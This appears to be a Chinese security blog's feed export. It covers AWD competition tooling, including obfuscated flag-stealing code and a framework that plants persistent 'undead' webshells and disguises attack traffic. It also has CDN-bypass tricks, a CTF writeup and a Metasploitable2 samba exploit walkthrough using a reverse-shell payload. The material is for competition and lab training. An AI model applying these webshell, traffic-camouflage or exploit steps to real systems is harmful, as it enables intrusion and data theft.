O00OOOO0000OO00O0 +=1 #line:28 else :#line:29 print (&quot;[-] %s request method error!&quot;%(str (O00O0O00O000000O0 [0 ])))#line:30 else :#line:31 pass #line:32 O00O00O000OOO000O =1 #line:33 while True :#line:34 for O00000O00O000O0O0 in range (len (OO00OO00000OOOOOO )):#line:35 OOO0OO0OO0000OO0O =socket_flag (url =OO00OO00000OOOOOO [O00000O00O000O0O0 ],method =OOOOO0OO0O00OOOOO [O00000O00O000O0O0 ],passwd =OO0OO000O0O0OO0O0 [O00000O00O000O0O0 ],get_flag_cmd =OOOO0000O0OOOOOO0 )#line:36 flag .append (OOO0OO0OO0000OO0O )#line:37 save_flag ()#line:38 print (&quot;3秒后尝试提交flag:&quot;)#line:39 for O00OOOO0000OO00O0 in range (1 ,4 ):#line:40 OOO00O0O0O0OO0O00 =&apos;&gt;&apos;*O00OOOO0000OO00O0 +&apos;[&apos;+str (O00OOOO0000OO00O0 )+&apos;s&apos;+&apos;]&apos;#line:41 print (&apos;%s&apos;%OOO00O0O0O0OO0O00 ,end =&apos;\r&apos;)#line:42 time .sleep (1 )#line:43 for O0OO0O00OO0000OO0 in flag :#line:44 submit_flag (url =OO0OOOO0OOOO00OO0 ,flag =O0OO0O00OO0000OO0 )#line:45 print (&quot;60秒进行下一轮操作:&quot;)#line:46 for O00OOOO0000OO00O0 in range (1 ,61 ):#line:47 OOO00O0O0O0OO0O00 =&apos;&gt;&apos;*O00OOOO0000OO00O0 +&apos;[&apos;+str (O00OOOO0000OO00O0 )+&apos;s&apos;+&apos;]&apos;#line:48 print (&apos;%s&apos;%OOO00O0O0O0OO0O00 ,end =&apos;\r&apos;)#line:49 time .sleep (1 )#line:50 flag =[]#line:51 O00O00O000OOO000O =O00O00O000OOO000O +1 #line:52 print (O00O00O000OOO000O ) 假如只给你混淆后的代码，相信很难会理解这个函数究竟在程序中干了什么 打包成exe文件发布简介这里就要向大家介绍一款神器—pyinstaller，这是一个专门用来将Python程序打包成exe格式的应用程序，除此之外它还有一个特别大的优点，经pyinstaller打包后的程序可以无需安装Python环境直接在其他机器上运行，该程序的安装方式可以参考官网：http://www.pyinstaller.org/ 使用操作我的操作系统是windows10，这里给大家演示一下打包的操作 就拿我前几天发布的AWD框架作为例子 源码结构： 定位到pyinstaller主程序的位置，在cmd窗口中输入命令 pyinstaller -F E:\YML-AWD-FRAMEWORK\main.py -F后输入的是项目主文件路径 成功生成后会在dist文件夹下找到刚刚打包好的文件 但是当我们打开生成的程序时，却发生了闪退，为了看清错误，我们在powershell下运行程序，错误提示我们缺少自写的第三方库 相信如果用过这个打包程序的师傅都会遇到这个问题，在打包简单程序时可以正常打开运行，但是当我们写的程序包含了自写的第三方库时，就会出现异常，最开始这个问题出现在我写机器人插件的时候，无奈之下我去百度上寻找pyinstaller的详细工作方式，它在打包的时候会自动导入Python的内置库，抱着试一试的心态我把自己写的第三方库放到了Python系统库目录下，而后同上面方式进行打包，最终成功解决了这个问题，后来的几个项目打包我也是采用这种方式，都很奏效。 通过打包成exe的方式，我们可以发布exe文件，这样就可以很好的保护源代码 弊端分析对于第一种编译为pyc的方法，近年出现了pyc的反编译技术，一些ctf比赛也以此作为一个考点 有很多站点例如https://tool.lu/pyc/就可以将pyc文件还原成Python代码 对于第三种方法，可能有人会觉得很安全，有一个名为pyinstxtractor.py的脚本可以在打包完毕的程序中提取出pyc文件，我们可以通过反编译pyc文件获得源代码 ，脚本下载地址：https://sourceforge.net/projects/pyinstallerextractor/ 方法推荐函数变量混淆+pyc编译虽然pyc文件可以反编译出源代码，但是经过我多次试验，将源代码经过变量混淆后再反编译为pyc文件是很困难的，以我上面混淆完的函数为例子，它编译成pyc文件后在进行反编译结果如下： 可以看到它无法还原，甚至部分还原出来的代码都是错的 打包为exe文件加壳这个思路就很简单了，将项目用pyinstaller打包后再加壳，这样就很难进行源代码还原操作了]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[置顶-搭建属于自己的AWD训练平台]]></title>
    <url>%2F2019%2F03%2F07%2F%E7%BD%AE%E9%A1%B6-%E6%90%AD%E5%BB%BA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84AWD%E8%AE%AD%E7%BB%83%E5%B9%B3%E5%8F%B0%2F</url>
    <content type="text"><![CDATA[本文首发于 安恒网络空间安全讲武堂 :https://mp.weixin.qq.com/s/ffh-Jkt9UUKHErxeUMw4aw 很多师傅可能很少有接触线下赛AWD的机会，所以可能在比赛中比他人少很多经验，今天就和大家分享一下如何在资源有限的情况下去搭建自己的awd线下赛环境 因为前一段时间写awd框架的缘故，我迫切的需要找一个实战环境来实验自己的框架是否可以正常运行，翻遍各大资源站点后，终于在github上找到了一个开源项目，这里分享给大家：https://github.com/zhl2008/awd-platform 在搭建的过程中大家可能看不太懂项目中的说明文档，所以在这里我实际给大家演示一遍，其中的一些细节我尽量一一说到，另外在文末还会分享我自己写的一个积分统计板(我的第二个版本源码找不到了，所以在这里给大家分享我第一次写的那个) 因为是个人嘛，毕竟资源有限，我只有一个腾讯云的学生机在空闲，今天就以这个机器为例进行搭建，给大家看一下我的配置 这配置很低了，不过实测开启10个队伍的靶机是无压力的 首先我们装一个ubuntu16.04的云服务器，然后登陆远程的ssh 将项目克隆到服务器上： git clone https://github.com/zhl2008/awd-platform.git 然后进入项目 cd awd-platform/ 然后下载一下镜像： docker pull zhl2008/web_14.04 这块我卡了好久，他最后按文档操作会报错，后来我看源码的docker名字不是这个，而是zhl2008/web_14.04 web_14.04 所以为了方便直接可以改一下镜像的名字，这样就不用改源码去了 docker tag zhl2008/web_14.04 web_14.04 然后接下来按照文档里说的操作一下 我这里实际的命令有 python batch.py web_yunnan_simple 10 python start.py ./ 10 这里用这个web_yunnan_simple的环境做例子，这个环境非常典型，包含了很多的基础漏洞，包括我的框架就是依照这个环境测试的 到现在为止，我们的靶机就可以访问了 因为是在一个服务器上运行了多个docker，靶机的映射端口规则是: team1 ---- 8801 team3 ---- 8802 team3 ---- 8803 ....以此类推 例如在我的环境下，靶机的地址就是：http://119.29.147.75:8801-8810 各个靶机的ssh密码可以在项目的文件夹下的pass.txt文件中 ssh的端口规则是： team1 ---- 2201 team2 ---- 2202 team3 ---- 2203 ....以此类推 关于check模块，他的check脚本是不能用的，我们需要进行一些修改，这个规则要根据自己的环镜自己编写，总体思路就是判断页面是否存在，存在就加一分，不存在就减一分，在他内置check脚本的基础上，我们可以稍微修改一下靶机环境的源码，然后用check脚本去访问，在他内置的脚本中还可以修改每次加分和扣分的多少 还有一个要注意的地方就是，在项目的根目录的flag_server/中，我们要赋予score.txt 和result.txt 777权限，否则分数变动无法进行同步 关于flag的提交方式和文档是一样的 得分情况可以访问ip:8080/score.txt 像我这个 我感觉太难看了，就写了个计分板 在使用的时候改一下源码里的ip地址就可以了 计分板源码打包：https://pan.baidu.com/s/18KlIeluaTtm-kT3KuXHseQ 提取码：cvdn 最后祝x平台越办越好。]]></content>
      <tags>
        <tag>原创教程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[查看站点真实ip-CDN绕过]]></title>
    <url>%2F2019%2F03%2F06%2F%E6%9F%A5%E7%9C%8B%E7%AB%99%E7%82%B9%E7%9C%9F%E5%AE%9Eip-CDN%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[CDN（content delivery network 或 content distribution network）即内容分发网络。一些站点开启了CDN后就会隐藏掉自己的真实ip，在某些需要获取站点真实ip的工作中，这将是一个障碍，下面总结一下常见的获取站点真实ip的方法。 判断是否存在cdnping通过多地ping可以查到站点的IP地址，如果返回的ip地址不是相同的，基本可以判定存在cdn 这里分享一个在线ping 的站点http://ping.chinaz.com/ ip域名强绑我们可以使一个域名和我们当前所查到的ip强绑，如果页面发生变化，应该存在cdn，强绑只需要在本机的host文件中修改就可以了 寻找真实ip非大陆访问有些站点加cdn仅仅是为了加速，所以在非大陆地区进行访问时，通过国外的DNS解析，可能会得到站点的真实ip 邮件响应头如果站点有发送邮件功能的话，可以想办法使站点向你的邮箱发送邮件，查看邮件响应头，往往可以暴露站点的真实ip 超流量回源有些站点的cdn往往可用流量是有限的，这时我们可以发送大量的请求包，类似cc攻击，当流量到达界限时，就会发生回源现象，这通常发生在一些免费CDN套餐和小CDN厂商上，一般高防CDN不会出现这种情况。 查看解析历史这是一种成功率极高的方法，站点可能创建之初并未添加CDN，这样就会存留下解析记录，通过查看解析历史可以寻找到服务器的真实ip 一般可以在：https://www.17ce.com/上查到解析历史记录 CloudFlarefreebuf上有一篇专门写对CloudFlare CDN的绕过：https://www.freebuf.com/articles/web/41533.html]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[置顶-项目发布-YML-AWD-FRAMEWORK]]></title>
    <url>%2F2019%2F03%2F04%2F%E7%BD%AE%E9%A1%B6-%E9%A1%B9%E7%9B%AE%E5%8F%91%E5%B8%83-YML-AWD-FRAMEWORK%2F</url>
    <content type="text"><![CDATA[框架首发于 安恒网络空间安全讲武堂 :https://mp.weixin.qq.com/s/r5gc0nfids896thBIW7XFg 花了大半个寒假的时间，终于完成了一直想写的awd线下半自动框架，编写过程中学到了很多，也感谢一些师傅的指点，文末会分享部分原创核心函数 框架已在我自有服务器搭建的awd环境下经过数次调试，修补了绝大部分致命bug 开发思路： 框架整体结构|--main.py(主函数及cmd交互模块) | |--code--addshell.py(自写第三方库文件) | |--data(存放用于加载数据的TXT文件) | |--html(用于存放站点源码) 开发思路和部分模块工作原理ip和shell存储模块为了方便后续维护和新功能的添加，将以TXT文件读写的方式存储和读取ip和shell信息，方便在程序退出第二次使用时，快速加载已储存的ip和shell信息 ip录入模块由于线下awd赛事靶机ip的不同(正式比赛中可能是范围类ip，小型比赛中可能是范围类端口)，框架同时支持范围ip和端口的添加，两类例子如下 ip范围： 端口范围： 不死马上传模块不死马是awd线下赛中一大杀器，其删不掉，改不了的特性往往能在线下赛中打乱对手的比赛心态，为了提高框架在各类环境成功生成不死马的几率，作者使用了直接在靶机上命令执行的方式(网上流行的不死马PHP启动文件的方式其实对于框架编写来说更加简单，但是其触发过程中可能遭遇目标靶机waf的拦截)，在成功添加了基础shell后，可以直接使用不死马模块进行不死马上传，为适应各类基础shell，上传支持post和get两种方式。 核心代码如图 流量混淆模块在获取站点源码结构时本来想利用自己的靶机做目录遍历然后返回路径列表，后来为了提升效率选择了将源码放在本地进行遍历，在使用模块前需要在库中attack_all()函数中修改框架所在路径，如图 为了模拟真实流量，在每段正常发送的URL后都会添加？shell=(随机字符串)，已达到隐藏获取flag真实流量的目的，相应代码如图 获取flag及提交模块获取flag前需要再次添加shell，可以是生成的不死马shell，设置再次添加是为了当比赛中直接有可获取flag的后门时可以直接使用收发flag模块 同时为了避免框架出现不可预期错误，程序会将最新flag保存在data目录下，在flag获取模块中，自动的过滤了重复的flag，减轻了框架在本地环境下的运行负担 交互体验为了框架的运行稳定性，使用了cmd模块，cmd模块类型提供了一个创建命令行解析器的框架，在某部分函数出错时，不至于导致框架崩溃 使用方法和基本流程：命令集合： Command Tips ------- ----------- addip 添加shell ip和端口 addshell 添加shell路径 saveshell 保存shell到文件 showip 查看ip列表 removeip 移除某个ip clearip 清除ip列表 saveip 将ip保存到文件 updead 上传bash不死马文件(.crons.php) loadip 加载储存的IP列表 loadwebshell 加载储存的shell列表 liuliang 进行流量混淆(请先添加ip或loadip) addflagshell 添加获取flag的shell saveflagshell 将获取flag的shell储存到文件 loadflagshell 加载储存的flagshell列表 getflag 获取flag(demo: getflag-cat /flag 注意分隔符是&quot;-&quot;) exit 退出 添加ip时需要添加ip地址和端口号，分割符为空格，两者皆支持范围添加，例如下面的例子 addip 10.10.10.10 80 addip 10.10.10.10-19 80 addip 10.10.10.10 80-90 removeip 可以删除掉自己机器的ip地址 确认ip地址无误后，可以通过saveip将其保存下来 addshell命令可以添加对方机器上的预留shell，支持get和post格式，已下是输入例子 addshell /a.php c post addshell /a.php c get 其中c为a.php的密码 添加完成后通过saveshell保存下来 如果希望维持权限，可以通过Updead上传不死马文件 flagshell是特定的shell文件，因为用Python去实现菜刀的功能很麻烦，所以获取flag 暂时通过命令执行的方式进行获取,添加flagshell的语法和addshell一样 getflag需要附带获取flag的命令，添加后会提示输入提交flag的地址，这时需要用yml-flag来代替flag当做命令输入，如下图的演示 这样就可以进行自动获取和提交了 关于流量混淆模块： 本人项目是在E盘写的，所以要正常使用该模块需要放在E盘下，并将站点源码放入html目录 进行流量混淆时，需要先加载ip列表（loadip）而后使用命令liuliang进行流量混淆 为了程序更好的兼容，将程序打包成了exe可执行程序，无需安装Python环境即可使用 同时也将源码全部打包，欢迎各位大佬完善和指点 程序源码在github:https://github.com/yemoli/yml-AWD-FRAMEWORK 已打包为exe格式的文件在百度网盘：https://pan.baidu.com/s/17UWvbfer8vlCcKw3NaJ2Eg 提取码1q3j]]></content>
      <tags>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-安恒2月赛部分writeup]]></title>
    <url>%2F2019%2F02%2F25%2F2019-%E5%AE%89%E6%81%922%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86writeup%2F</url>
    <content type="text"><![CDATA[Cryptohahaha打开压缩包应该是CRC32爆破 密码是： tanny_is_very_beautifu1_ 打开压缩包里的PDF文件 很简单的一个排列组合问题，除去了flag{}这几个字符，组成flag的字符有以下几种情况 1@eshlcn 12eshlcn !2eshlcn !@eshlcn 写出脚本跑一下发现是1@eshlcn 脚本如下： 12345678910111213141516171819202122232425import hashlibdef hash_encode(test): sha1 = hashlib.sha1() sha1.update(test.encode('utf-8')) res = sha1.hexdigest() return resdef str_sort(s): if len(s) &lt;= 1: return [s] str_list = [] for i in range(len(s)): for j in str_sort(s[0:i] + s[i + 1:]): str_list.append(s[i] + j) return str_lists = '1@eshcn'str_list = str_sort(s)print(len(str_list), str_list)for test in str_list: test = "flag&#123;"+test+"&#125;" result = hash_encode(test) if result == "e6079c5ce56e781a50f4bf853cdb5302e0d8f054": print("flag:"+test) break flag为： flag{sh@1enc} Misc来玩个游戏吧题目如图 第一关的字符串明显是盲文，在线解密一下 https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen 得到了??41402abc4b2a76b9719d911017c592，这应该是一串MD5 ，百度一下应该是hello的 第二关要求两个文件不相同但是MD5要一样，网上有这样一篇文章 https://blog.csdn.net/sysprogram/article/details/73753354 用命令 fastcoll_v1.0.0.5.exe -p C:\windows\notepad.exe -o D:\notepad1.exe D:\notepad2.exe 生成两个文件，成功得到邮件 送你一封包含flag的邮件： Dear Professional ; Especially for you - this cutting-edge intelligence ! If you no longer wish to receive our publications simply reply with a Subject: of &quot;REMOVE&quot; and you will immediately be removed from our club . This mail is being sent in compliance with Senate bill 2216 , Title 9 ; Section 306 ! THIS IS NOT MULTI-LEVEL MARKETING . Why work for somebody else when you can become rich as few as 35 weeks . Have you ever noticed more people than ever are surfing the web and people will do almost anything to avoid mailing their bills . Well, now is your chance to capitalize on this ! WE will help YOU decrease perceived waiting time by 120% &amp; decrease perceived waiting time by 140% . You can begin at absolutely no cost to you . But don&apos;t believe us ! Mrs Jones of Minnesota tried us and says &quot;I was skeptical but it worked for me&quot; . We assure you that we operate within all applicable laws . Because the Internet operates on &quot;Internet time&quot; you must act now ! Sign up a friend and your friend will be rich too . Warmest regards . Dear Cybercitizen , We know you are interested in receiving red-hot announcement ! We will comply with all removal requests ! This mail is being sent in compliance with Senate bill 1619 ; Title 2 ; Section 301 . This is NOT unsolicited bulk mail ! Why work for somebody else when you can become rich within 53 MONTHS ! Have you ever noticed more people than ever are surfing the web and more people than ever are surfing the web . Well, now is your chance to capitalize on this . We will help you use credit cards on your website plus decrease perceived waiting time by 150% . The best thing about our system is that it is absolutely risk free for you ! But don&apos;t believe us ! Mrs Simpson of Washington tried us and says &quot;Now I&apos;m rich, Rich, RICH&quot; . We assure you that we operate within all applicable laws ! We beseech you - act now ! Sign up a friend and your friend will be rich too . Thank-you for your serious consideration of our offer ! Dear Friend ; This letter was specially selected to be sent to you ! If you no longer wish to receive our publications simply reply with a Subject: of &quot;REMOVE&quot; and you will immediately be removed from our mailing list . This mail is being sent in compliance with Senate bill 2716 , Title 2 ; Section 306 ! This is a ligitimate business proposal . Why work for somebody else when you can become rich inside 33 weeks . Have you ever noticed more people than ever are surfing the web plus more people than ever are surfing the web . Well, now is your chance to capitalize on this ! WE will help YOU SELL MORE and process your orders within seconds . You can begin at absolutely no cost to you . But don&apos;t believe us ! Mrs Jones of Kentucky tried us and says &quot;I was skeptical but it worked for me&quot; ! This offer is 100% legal ! We implore you - act now . Sign up a friend and you&apos;ll get a discount of 50% . God Bless . 正好以前遇到过这种邮件的解密站点http://www.spammimic.com/decode.shtml flag{a0dd1e2e6b87fe47e5ad0184dc291e04}]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[转载-Metasploit模块简介]]></title>
    <url>%2F2019%2F02%2F21%2F%E8%BD%AC%E8%BD%BD-Metasploit%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[本文转载自博客园 模块通过Metasploit框架所装载、集成并对外提供的最核心的渗透测试功能实现代码。分为辅助模块（Aux)、渗透攻击模块（Exploits)、后渗透攻击模块（Post)、攻击载荷模块（payloads)、编码器模块（Encoders)、空指令模块（Nops)。这些模块拥有非常清晰的结构和一个预定义好的接口，并可以组合支持信息收集、渗透攻击与后渗透攻击拓展。 辅助模块 在渗透信息搜集环节提供了大量的辅助模块支持，包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码、口令猜测等模块。此外，辅助模块中还包括一些无须加载攻击载荷，同时往往不是取得目标系统远程控制权的渗透攻击，例如：拒绝服务攻击。 渗透攻击模块 利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，以植入和运行攻击载荷，从而获得对目标系统访问控制权的代码组件。metasploit框架中渗透攻击模块可以按照所利用的安全漏洞所在的位置分为主动渗透攻击与被动渗透攻击两大类。 主动渗透攻击：所利用的安全漏洞位于网络服务端软件与服务端软件承载的上层应用程序之中，由于这些服务通常是在主机上开启一些监听端口并等待客户端连接，通过连接目标系统网络服务，注入一些特殊构造的包含“邪恶”攻击数据的网络请求内容，触发安全漏洞，并使得远程服务进行执行“邪恶”数据中包含的攻击载荷，从而获取目标系统的控制会话。针对网络服务端的主动渗透攻击属于传统的渗透攻击。还有web应用程序渗透攻击、SCADA工业控制系统服务渗透攻击。 被动渗透攻击：利用漏洞位于客户端软件中，如浏览器、浏览插件、电子邮件客户端、office与Adobe等各种文档与编辑软件。对于这类存在于客户端软件的安全漏洞，我们无法主动地将数据从远程输入到客户端软件中，因此只能采用被动渗透攻击方式。即构造出“邪恶”的网页、电子邮件或文档文件，并通过架设包含此类恶意内容的服务端、发送邮件附件、结合社会工程学攻击分发并诱骗目标用户打开、结合网络欺骗和劫持技术，等目标系统上的用户访问到这些邪恶内容，从而触发客户端软件中的安全漏洞，给出控制目标系统的shell会话。客户端软件被动渗透攻击能够绕过防火墙等网络边界防护措施，最常见的两类被动渗透攻击为浏览器软件漏洞攻击和文件格式类漏洞攻击。 攻击载荷模块 攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码，通常作用是为渗透攻击者打开在目标系统上的控制会话连接。在传统的渗透代码开发中，攻击载荷只是一段功能简单的ShellCode代码，以汇编语言编制并转换为目标系统CPU体系结构支持的机器代码，在渗透攻击触发漏洞后，将程序执行流程劫持并跳转入这段机器代码中执行，从而完成ShellCode中实现的单一功能。 metasploit攻击载荷模块分为独立（Single)、传输器（Stager)、传输体（Stage)三种类型。 独立攻击载荷是完全自包含的，可直接独立地植入目标系统进行执行，比如“windows/shell_bind_tcp”是适用于Windows操作系统平台，能够将Shell控制会话绑定在指定TCP端口上的攻击载荷。在一些比较特殊情况下，可能会对攻击载荷的大小、运行条件有所限制，比如特定安全漏洞利用时可填充邪恶攻击缓冲区的可用空间很小、windows 7等新型操作系统所引入的NX(堆栈不可执行）、DEP(数据执行保护）等安全防御机制，在这些场景情况下，Metasploit提供了传输器和传输体配对分阶段植入的技术，由渗透攻击模块首先植入代码精悍短小且非常可靠的传输器载荷，然后在运行传输器载荷时进一步下载传输体载荷并执行。 空指令模块 空指令（NOP)是一些对程序运行状态不会造成任何实质影响的空操作或无关操作指令，最典型的空指令就是空操作，在X86 CPU体系结构平台上的操作码是ox90. 在渗透攻击构造邪恶数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。 编码器模块 攻击载荷与空指令模块组装完成一个指令序列后，在这段指令被渗透攻击模块加入邪恶数据缓冲区交由目标系统运行之前，Metasploit框架还需要完成一道非常重要的工序—-编码。 编码模块的第一个使命是确保攻击载荷中不会出现渗透攻击过程中应加以避免的”坏字符“。 编码器第二个使命是对攻击载荷进行”免杀“处理，即逃避反病毒软件、IDS入侵检测系统和IPS入侵防御系统的检测与阻断。 后渗透模块 主要支持在渗透攻击取得目标系统远程控制权之后，在受控系统中进行各种各样的后渗透攻击动作，比如获取敏感信息，进一步括展，实施跳板攻击等。]]></content>
      <tags>
        <tag>转载文章</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[针对Metasploitable2靶机的测试]]></title>
    <url>%2F2019%2F02%2F19%2F%E9%92%88%E5%AF%B9Metasploitable2%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[Metasploitable2是一个特别制作的ubuntu操作系统，主要用于安全工具测试和常见漏洞攻击的演示 首先使用msf的nmap模块对目标机进行扫描，收集可用服务信息，我这里靶机ip是192.168.11.128 nmap -sV 192.168.11.128 靶机上开启了许多端口，观察发现主机上运行着Samba 3.x服务。 Samba是在Linux系统上实现SMB协议的软件，SMB是一种在局域网上共享文件和打印机的通信协议。 输入search samba搜索可利用的漏洞模块，等待一会后会出现一些可利用的模块 从中挑选一个进行利用 use exploit/multi/samba/usermap_script 查看该利用模块下可选择的攻击载荷模块： show payloads 选择最基础的cmd/unix/reverse反向攻击载荷模块 set payload cmd/unix/reverse 然后查看需要设置的参数 show options 对应的设置靶机ip，端口和攻击机ip 输入run或者exploit进行攻击 可以看到成功获得了靶机的shell]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python实现进度条]]></title>
    <url>%2F2019%2F02%2F16%2Fpython%E5%AE%9E%E7%8E%B0%E8%BF%9B%E5%BA%A6%E6%9D%A1%2F</url>
    <content type="text"><![CDATA[最近在写python的项目，为了美观想加一个进度条，正好这里收集一下找到的众多可用例子 因为只是装饰作用，就没收集带第三方库的代码 一12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python3import timeclass Index(object): def __init__(self, number=50, decimal=2): """ :param decimal: 你保留的保留小数位 :param number: # 号的 个数 """ self.decimal = decimal self.number = number self.a = 100 / number # 在百分比 为几时增加一个 # 号 def __call__(self, now, total): # 1. 获取当前的百分比数 percentage = self.percentage_number(now, total) # 2. 根据 现在百分比计算 well_num = int(percentage / self.a) # print("well_num: ", well_num, percentage) # 3. 打印字符进度条 progress_bar_num = self.progress_bar(well_num) # 4. 完成的进度条 result = "\r%s %s" % (progress_bar_num, percentage) return result def percentage_number(self, now, total): """ 计算百分比 :param now: 现在的数 :param total: 总数 :return: 百分 """ return round(now / total * 100, self.decimal) def progress_bar(self, num): """ 显示进度条位置 :param num: 拼接的 “#” 号的 :return: 返回的结果当前的进度条 """ # 1. "#" 号个数 well_num = "#" * num # 2. 空格的个数 space_num = " " * (self.number - num) return '[%s%s]' % (well_num, space_num)index = Index()start = 371for i in range(start + 1): print(index(i, start), end='') time.sleep(0.01) # \r 返回本行开头 # end : python 结尾不加任何操作, 默认是空格 效果图： 二1234import timefor i in range(5): time.sleep(0.3) print(str(i)*10) 效果图 三1234567import timeimport sysfor i in range(8): time.sleep(0.3) print('\r', end='') print(str(i)*10, end='') sys.stdout.flush() 效果图 四123456789import timeimport sysn = 10for i in range(n): time.sleep(0.3) sys.stdout.write('\r') sys.stdout.write(str(i)*(n-i)) sys.stdout.flush()sys.stdout.write('n') 效果图 五1234567891011import timeimport sysdef progress_test(): bar_length=20 for percent in range(0, 101): hashes = '#' * int(percent/100.0 * bar_length) spaces = ' ' * (bar_length - len(hashes)) sys.stdout.write("\rPercent: [%s] %d%%"%(hashes + spaces, percent)) sys.stdout.flush() time.sleep(1)progress_test() 效果图]]></content>
      <tags>
        <tag>代码收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[curl说明书]]></title>
    <url>%2F2019%2F02%2F15%2Fcurl%E8%AF%B4%E6%98%8E%E4%B9%A6%2F</url>
    <content type="text"><![CDATA[在以下选项中，(H) 表示仅适用 HTTP/HTTPS ，(F) 表示仅适用于 FTP --anyauth 选择 &quot;any&quot; 认证方法 (H) -a, --append 添加要上传的文件 (F/SFTP) --basic 使用HTTP基础认证（Basic Authentication）(H) --cacert FILE CA 证书，用于每次请求认证 (SSL) --capath DIR CA 证书目录 (SSL) -E, --cert CERT[:PASSWD] 客户端证书文件及密码 (SSL) --cert-type TYPE 证书文件类型 (DER/PEM/ENG) (SSL) --ciphers LIST SSL 秘钥 (SSL) --compressed 请求压缩 (使用 deflate 或 gzip) -K, --config FILE 指定配置文件 --connect-timeout SECONDS 连接超时设置 -C, --continue-at OFFSET 断点续转 -b, --cookie STRING/FILE Cookies字符串或读取Cookies的文件位置 (H) -c, --cookie-jar FILE 操作结束后，要写入 Cookies 的文件位置 (H) --create-dirs 创建必要的本地目录层次结构 --crlf 在上传时将 LF 转写为 CRLF --crlfile FILE 从指定的文件获得PEM格式CRL列表 -d, --data DATA HTTP POST 数据 (H) --data-ascii DATA ASCII 编码 HTTP POST 数据 (H) --data-binary DATA binary 编码 HTTP POST 数据 (H) --data-urlencode DATA url 编码 HTTP POST 数据 (H) --delegation STRING GSS-API 委托权限 --digest 使用数字身份验证 (H) --disable-eprt 禁止使用 EPRT 或 LPRT (F) --disable-epsv 禁止使用 EPSV (F) -D, --dump-header FILE 将头信息写入指定的文件 --egd-file FILE 为随机数据设置EGD socket路径(SSL) --engine ENGINGE 加密引擎 (SSL). &quot;--engine list&quot; 指定列表 -f, --fail 连接失败时不显示HTTP错误信息 (H) -F, --form CONTENT 模拟 HTTP 表单数据提交（multipart POST） (H) --form-string STRING 模拟 HTTP 表单数据提交 (H) --ftp-account DATA 帐户数据提交 (F) --ftp-alternative-to-user COMMAND 指定替换 &quot;USER [name]&quot; 的字符串 (F) --ftp-create-dirs 如果不存在则创建远程目录 (F) --ftp-method [MULTICWD/NOCWD/SINGLECWD] 控制 CWD (F) --ftp-pasv 使用 PASV/EPSV 替换 PORT (F) -P, --ftp-port ADR 使用指定 PORT 及地址替换 PASV (F) --ftp-skip-pasv-ip 跳过 PASV 的IP地址 (F) --ftp-pret 在 PASV 之前发送 PRET (drftpd) (F) --ftp-ssl-ccc 在认证之后发送 CCC (F) --ftp-ssl-ccc-mode ACTIVE/PASSIVE 设置 CCC 模式 (F) --ftp-ssl-control ftp 登录时需要 SSL/TLS (F) -G, --get 使用 HTTP GET 方法发送 -d 数据 (H) -g, --globoff 禁用的 URL 队列 及范围使用 {} 和 [] -H, --header LINE 要发送到服务端的自定义请求头 (H) -I, --head 仅显示响应文档头 -h, --help 显示帮助 -0, --http1.0 使用 HTTP 1.0 (H) --ignore-content-length 忽略 HTTP Content-Length 头 -i, --include 在输出中包含协议头 (H/F) -k, --insecure 允许连接到 SSL 站点，而不使用证书 (H) --interface INTERFACE 指定网络接口／地址 -4, --ipv4 将域名解析为 IPv4 地址 -6, --ipv6 将域名解析为 IPv6 地址 -j, --junk-session-cookies 读取文件中但忽略会话cookie (H) --keepalive-time SECONDS keepalive 包间隔 --key KEY 私钥文件名 (SSL/SSH) --key-type TYPE 私钥文件类型 (DER/PEM/ENG) (SSL) --krb LEVEL 启用指定安全级别的 Kerberos (F) --libcurl FILE 命令的libcurl等价代码 --limit-rate RATE 限制传输速度 -l, --list-only 只列出FTP目录的名称 (F) --local-port RANGE 强制使用的本地端口号 -L, --location 跟踪重定向 (H) --location-trusted 类似 --location 并发送验证信息到其它主机 (H) -M, --manual 显示全手动 --mail-from FROM 从这个地址发送邮件 --mail-rcpt TO 发送邮件到这个接收人(s) --mail-auth AUTH 原始电子邮件的起始地址 --max-filesize BYTES 下载的最大文件大小 (H/F) --max-redirs NUM 最大重定向数 (H) -m, --max-time SECONDS 允许的最多传输时间 --metalink 处理指定的URL上的XML文件 --negotiate 使用 HTTP Negotiate 认证 (H) -n, --netrc 必须从 .netrc 文件读取用户名和密码 --netrc-optional 使用 .netrc 或 URL; 将重写 -n 参数 --netrc-file FILE 设置要使用的 netrc 文件名 -N, --no-buffer 禁用输出流的缓存 --no-keepalive 禁用 connection 的 keepalive --no-sessionid 禁止重复使用 SSL session-ID (SSL) --noproxy 不使用代理的主机列表 --ntlm 使用 HTTP NTLM 认证 (H) -o, --output FILE 将输出写入文件，而非 stdout --pass PASS 传递给私钥的短语 (SSL/SSH) --post301 在 301 重定向后不要切换为 GET 请求 (H) --post302 在 302 重定向后不要切换为 GET 请求 (H) --post303 在 303 重定向后不要切换为 GET 请求 (H) -#, --progress-bar 以进度条显示传输进度 --proto PROTOCOLS 启用/禁用 指定的协议 --proto-redir PROTOCOLS 在重定向上 启用/禁用 指定的协议 -x, --proxy [PROTOCOL://]HOST[:PORT] 